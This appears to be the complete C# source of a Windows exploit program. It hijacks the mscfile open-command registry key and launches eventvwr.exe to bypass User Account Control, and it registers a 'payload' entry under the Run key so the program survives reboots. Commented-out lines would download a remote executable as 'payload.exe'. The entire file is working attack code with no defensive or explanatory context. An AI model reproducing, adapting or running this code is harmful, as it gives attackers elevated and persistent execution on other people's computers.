using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using Microsoft.Win32;
using System.Diagnostics;
using System.IO;

namespace UAC
{
    static class Program
    {
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main()
        {




         //  string DownloadFire = "https://the.earth.li/~sgtatham/putty/latest/x86/putty.exe";
            string FilePath = @"C:\Users\qwert\Desktop\vs_Enterprise.exe";
          //  WebClient Client = new WebClient();
           // Client.DownloadFile(DownloadFire, FilePath + "payload.exe");
            Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes\mscfile\shell\open\command").SetValue("", FilePath);
            Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").SetValue("payload", FilePath);
            Process.Start("eventvwr.exe");
        }
    }
}
